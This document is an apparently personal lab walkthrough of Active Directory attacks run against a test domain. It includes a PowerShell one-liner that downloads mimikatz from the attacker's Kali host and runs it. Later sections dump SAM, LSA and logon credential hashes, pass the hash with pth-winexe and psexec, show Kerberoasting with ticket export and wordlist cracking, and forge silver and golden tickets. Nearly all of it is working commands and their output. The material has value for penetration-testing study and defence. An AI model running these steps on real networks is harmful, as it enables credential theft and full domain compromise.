# Attacking Active Directory
## Lab Environment

|Server|IP Address|OS|Function|
|---|---|---|---|
|dc.lab.vx|192.168.17.141|Windows Server 2016|Domain Controller|
|svr.lab.vx|192.168.17.151|Windows Server 2016|Domain Member Server, SQL Server|
|client.lab.vx|192.168.17.161|Windows 10 1607|Domain Member Workstation, SQL Server Management Studio|

# 1. Cached Credential Storage and Retrieval
**On Kali**: Setup web server to host `mimikatz`

```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
sudo python3 -m http.server 80 &> /dev/null &
```

**On Target**: Download and run `mimikatz`
- Download: `(New-Object System.Net.WebClient).DownloadFile()`
- Run: `Start-Process`

```console
powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
```
**On Target**: mimikatz commands
- Ref: <https://tools.thehacker.recipes/mimikatz>

|Command|Function|
|---|---|
|`privilege::debug`|Requests the debug privilege `SeDebugPrivilege`; required to debug and adjust the memory of a process owned by another account|
|`token::elevate`|Impersonates a SYSTEM token (default) or domain admin token (using `/domainadmin`)|
|`lsadump::sam`|Dumps the local Security Account Manager (SAM) NT hashes; operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM)|
|`lsadump::lsa /patch`|Extracts hashes from memory by asking the LSA server; `/patch` or `/inject` takes place on the fly|
|`sekurlsa::logonpasswords`|Lists all available provider credentials; usually shows recently logged on user and computer credentials|

- ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:

```console
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)

mimikatz # lsadump::lsa /patch
ERROR kuhl_m_lsadump_lsa_getHandle ; OpenProcess (0x00000005)

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

## 1.1. Successful `lsadump::sam` example

```console
mimikatz # lsadump::sam
Domain : CLIENT
SysKey : 732c3b24f5f9c476753d4d1bc72961d7
Local SID : S-1-5-21-1540030335-1244868743-683777651

SAMKey : 3e3e9d70bd634ed43edbe5548d50e40e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d0e4eff03c20be1cf228acad5ae9dffa

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-GKEGHIVAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 56498ceffdf35f16cffb36744b2f98f76955058b3918c827e173fc7aa401f31f
      aes128_hmac       (4096) : 1f052f941e6b84ff8df58a0157dd7b25
      des_cbc_md5       (4096) : d5612916b59bad51

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-GKEGHIVAdministrator
    Credentials
      des_cbc_md5       : d5612916b59bad51


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 5a2b1b78290d381def497905d467fcff

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b848a29d177ddaf268c55ff8b0a27e40

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fd924dec8a07c294a448fe64a59d6253b11700fd8b9ba0b04914baca366adee8
      aes128_hmac       (4096) : a09548edf5d6ef88615586ad4315d147
      des_cbc_md5       (4096) : 982a37cb1998d66e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 982a37cb1998d66e


RID  : 000003eb (1003)
User : localadmin
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
    lm  - 0: 16c96a30f045654ca0f5277d816dc3fc
    ntlm- 0: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 35807c03d79f70538886cc1f45212e9c

* Primary:Kerberos-Newer-Keys *
    Default Salt : CLIENT.LAB.VXlocaladmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0cbf515a0f766032f6c3d226bebbb2de3ff3252c0107d545839a11da9ea0d723
      aes128_hmac       (4096) : 4541dc99ef9a196bfa67fdb81098a8e3
      des_cbc_md5       (4096) : ecd6e0d6237ca19e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : CLIENT.LAB.VXlocaladmin
    Credentials
      des_cbc_md5       : ecd6e0d6237ca19e
```

## 1.2. Successful `lsadump::lsa /patch` example

```console
mimikatz # lsadump::lsa /patch
Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003eb (1003)
User : localadmin
LM   :
NTLM : e19ccf75ee54e06b06a5907af13cef42

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   :
NTLM : 5a2b1b78290d381def497905d467fcff
```

## 1.3. Successful `sekurlsa::logonpasswords` example

```console
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7831562 (00000000:0077800a)
Session           : Interactive from 0
User Name         : mike
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 9:13:04 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1105
        msv :
         [00000003] Primary
         * Username : mike
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 0c6f0ff405f11531e7cd38a3f89ad32f
        tspkg :
        wdigest :
         * Username : mike
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : mike
         * Domain   : LAB.VX
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3508055 (00000000:00358757)
Session           : Interactive from 1
User Name         : domainadmin
Domain            : LAB
Logon Server      : DC
Logon Time        : 4/10/2022 8:48:56 PM
SID               : S-1-5-21-1470288461-3401294743-676794760-1104
        msv :
         [00000003] Primary
         * Username : domainadmin
         * Domain   : LAB
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
         * DPAPI    : 66880edfa688d3f7b7ab4a215cee53a7
        tspkg :
        wdigest :
         * Username : domainadmin
         * Domain   : LAB
         * Password : (null)
        kerberos :
         * Username : domainadmin
         * Domain   : LAB.VX
         * Password : (null)
        ssp :
        credman :
        cloudap :

••• OUTPUT TRUNCATED •••
```

# 2. Pass the Hash

☝️ **Note**: LM hashes are not used from Windows 10 onwards, string of 32 zeros can used to fill the LM hash portion of the pth-winexe command

## 2.1. pth-winexe
- Domain account

```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
lab\domainadmin

C:\Windows\system32>hostname
hostname
SVR
```

- Local account

```console
┌──(kali㉿kali)-[~]
└─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
svr\administrator

C:\Windows\system32>hostname
hostname
SVR
```

## 2.2. mimikatz - sekurlsa::pth
### 2.2.1. Domain account
- On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
- The `sekurlsa::pth` will spawn a new cmd window

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:domainadmin /domain:lab.vx /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : domainadmin
domain  : lab.vx
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
  |  PID  2536
  |  TID  7400
  |  LSA Process is now R/W
  |  LUID 0 ; 10105231 (00000000:009a318f)
  \_ msv1_0   - data copy @ 00000129DC857510 : OK !
  \_ kerberos - data copy @ 00000129DC9DA8C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000129DC9D00E8 (32) -> null
```

- Connect to the target machine in the new cmd window

```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\dc cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
lab\domainadmin

C:\Windows\system32>hostname
DC
```

### 2.2.2. Local account
- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:administrator /domain:* /ntlm:e19ccf75ee54e06b06a5907af13cef42
user    : administrator
domain  : *
program : cmd.exe
impers. : no
NTLM    : e19ccf75ee54e06b06a5907af13cef42
  |  PID  6872
  |  TID  5672
  |  LSA Process was already R/W
  |  LUID 0 ; 13220694 (00000000:00c9bb56)
  \_ msv1_0   - data copy @ 00000129DC9C5AB0 : OK !
  \_ kerberos - data copy @ 00000129DC9D8288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000129DBEE4128 (32) -> null
```

- Connect to the target machine in the new cmd window
- ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd

```console
C:\Windows\system32>whoami
lab\mike

C:\Windows\system32>hostname
CLIENT

C:\Windows\system32>psexec \\svr cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
svr\administrator

C:\Windows\system32>hostname
SVR
```

# 3. Service Account Attack
## 3.1. Kerberoasting
- Ref: <https://github.com/nidem/kerberoast>

### 3.1.1. Discover SPNs

```console
C:\Users\mike>setspn -Q */*
Checking domain DC=lab,DC=vx
CN=krbtgt,CN=Users,DC=lab,DC=vx
        kadmin/changepw
CN=SVR,CN=Computers,DC=lab,DC=vx
        TERMSRV/SVR
        TERMSRV/SVR.lab.vx
        RestrictedKrbHost/SVR
        HOST/SVR
        RestrictedKrbHost/SVR.lab.vx
        HOST/SVR.lab.vx
CN=CLIENT,CN=Computers,DC=lab,DC=vx
        TERMSRV/CLIENT
        TERMSRV/CLIENT.lab.vx
        RestrictedKrbHost/CLIENT
        HOST/CLIENT
        RestrictedKrbHost/CLIENT.lab.vx
        HOST/CLIENT.lab.vx
CN=DC,OU=Domain Controllers,DC=lab,DC=vx
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.lab.vx
        ldap/DC.lab.vx/ForestDnsZones.lab.vx
        ldap/DC.lab.vx/DomainDnsZones.lab.vx
        TERMSRV/DC
        TERMSRV/DC.lab.vx
        DNS/DC.lab.vx
        GC/DC.lab.vx/lab.vx
        RestrictedKrbHost/DC.lab.vx
        RestrictedKrbHost/DC
        RPC/cba15170-f237-42f7-a29f-3a1cd3cb839e._msdcs.lab.vx
        HOST/DC/LAB
        HOST/DC.lab.vx/LAB
        HOST/DC
        HOST/DC.lab.vx
        HOST/DC.lab.vx/lab.vx
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/cba15170-f237-42f7-a29f-3a1cd3cb839e/lab.vx
        ldap/DC/LAB
        ldap/cba15170-f237-42f7-a29f-3a1cd3cb839e._msdcs.lab.vx
        ldap/DC.lab.vx/LAB
        ldap/DC
        ldap/DC.lab.vx
        ldap/DC.lab.vx/lab.vx
CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
        MSSQLSvc/SVR.lab.vx:1433
        MSSQLSvc/SVR.lab.vx

Existing SPN found!
```

### 3.1.2. Request tickets

```console
PS C:\Users\mike> klist

Current LogonId is 0:0xa48995

Cached Tickets: (2)

#0>     Client: mike @ LAB.VX
        Server: krbtgt/LAB.VX @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/16/2022 9:53:54 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC.lab.vx

#1>     Client: mike @ LAB.VX
        Server: ldap/DC.lab.vx/lab.vx @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 4/16/2022 9:55:16 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC.lab.vx
PS C:\Users\mike> Add-Type -AssemblyName System.IdentityModel
PS C:\Users\mike> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433


Id                   : uuid-95b73e7f-8a7a-493c-affd-383f7472dbfd-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 16/4/2022 2:00:51 am
ValidTo              : 16/4/2022 11:53:54 am
ServicePrincipalName : MSSQLSvc/SVR.lab.vx:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey



PS C:\Users\mike> klist

Current LogonId is 0:0xa48995

Cached Tickets: (3)

#0>     Client: mike @ LAB.VX
        Server: krbtgt/LAB.VX @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/16/2022 9:53:54 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC.lab.vx

#1>     Client: mike @ LAB.VX
        Server: MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/16/2022 10:00:51 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: DC.lab.vx

#2>     Client: mike @ LAB.VX
        Server: ldap/DC.lab.vx/lab.vx @ LAB.VX
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 4/16/2022 9:55:16 (local)
        End Time:   4/16/2022 19:53:54 (local)
        Renew Time: 4/23/2022 9:53:54 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC.lab.vx
```

### 3.1.2. Dump tickets
```console
mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:53:54 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
   * Saved to file     : 0-40e10000-mike@krbtgt~LAB.VX-LAB.VX.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 16/4/2022 10:00:51 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : MSSQLSvc/SVR.lab.vx:1433 @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi

[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:55:16 am ; 16/4/2022 7:53:54 pm ; 23/4/2022 9:53:54 am
   Server Name       : ldap/DC.lab.vx/lab.vx @ LAB.VX
   Client Name       : mike @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 2-40a50000-mike@ldap~DC.lab.vx~lab.vx-LAB.VX.kirbi
```

- ☝️ **Note**: to retrieve user kerberos tickets, do not use `privilege::debug` + `token::elevate` in mimikatz; doing so impersonates the `SYSTEM` token and ends up retrieving machine kerberos tickets instead

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

848     {0;000003e7} 0 D 20011          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;004e2d49} 2 F 6986530     LAB\mike        S-1-5-21-1470288461-3401294743-676794760-1105   (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 0 D 7103754     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)

mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;

[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;

[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:15:59 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : cifs/DC.lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

[00000003] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : cifs/DC.lab.vx/lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

[00000004] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : CLIENT$ @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;

[00000005] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : ldap/DC.lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;

[00000006] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 4/16/2022 9:09:49 AM ; 4/16/2022 7:09:49 PM ; 4/23/2022 9:09:49 AM
   Server Name       : LDAP/DC.lab.vx/lab.vx @ LAB.VX
   Client Name       : client$ @ LAB.VX
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
```

- ☝️ **Note**: In event of `ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)` error, check that the user has permissions to write to the present working directory
- e.g. Attempting to run `C:\Windows\System32\cmd.exe` as a non-admin user works, but attempting to use mimikatz to save tickets to `C:\Windows\System32\` will result in write errors

```console
C:\Windows\System32>mimikatz

mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:33:45 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : krbtgt/LAB.VX @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)


[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:34:21 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : cifs/svr.lab.vx @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)


[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 16/4/2022 9:34:17 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : RPCSS/svr.lab.vx @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)


[00000003] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 16/4/2022 9:34:16 am ; 16/4/2022 7:33:45 pm ; 23/4/2022 9:33:45 am
   Server Name       : MSSQLSvc/svr.lab.vx:1433 @ LAB.VX
   Client Name       : MSSQLSysAdm @ LAB.VX
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
```

### 3.1.3. Crack KRB_TGS to retrieve service account password (brute force)
- Setup `kerberoast` on Kali Linux

```console
┌──(kali㉿kali)-[~]
└─$ sudo apt update
Get:1 http://mirror.aktkn.sg/kali kali-rolling InRelease [30.6 kB]
Get:2 http://mirror.aktkn.sg/kali kali-rolling/main amd64 Packages [18.2 MB]
Get:3 http://mirror.aktkn.sg/kali kali-rolling/main amd64 Contents (deb) [42.0 MB]
Get:4 http://mirror.aktkn.sg/kali kali-rolling/contrib amd64 Packages [116 kB]
Get:5 http://mirror.aktkn.sg/kali kali-rolling/contrib amd64 Contents (deb) [155 kB]
Get:6 http://mirror.aktkn.sg/kali kali-rolling/non-free amd64 Packages [214 kB]
Get:7 http://mirror.aktkn.sg/kali kali-rolling/non-free amd64 Contents (deb) [1,005 kB]
Fetched 61.7 MB in 8s (7,592 kB/s)
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
954 packages can be upgraded. Run 'apt list --upgradable' to see them.
┌──(kali㉿kali)-[~]
└─$ sudo apt install kerberoast
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  kerberoast
0 upgraded, 1 newly installed, 0 to remove and 954 not upgraded.
Need to get 17.5 kB of archives.
After this operation, 84.0 kB of additional disk space will be used.
Get:1 http://http.kali.org/kali kali-rolling/main amd64 kerberoast all 0~git20200516-0kali2 [17.5 kB]
Fetched 17.5 kB in 1s (29.2 kB/s)
Selecting previously unselected package kerberoast.
(Reading database ... 292319 files and directories currently installed.)
Preparing to unpack .../kerberoast_0~git20200516-0kali2_all.deb ...
Unpacking kerberoast (0~git20200516-0kali2) ...
Setting up kerberoast (0~git20200516-0kali2) ...
Processing triggers for kali-menu (2021.4.2) ...
```

- Upload the dumped KRB_TGS and run the kerberoast brute force script

```console
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbiCracking 1 tickets...
found password for ticket 0: P@ssw0rd  File: 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbi
Successfully cracked all tickets
```

## 3.2. Silver Ticket

```console
kerberos::purge
kerberos::list
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
kerberos::list
```

# 5. Golden Ticket

```console
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
misc::cmd
psexec.exe \\dc01 cmd.exe
```
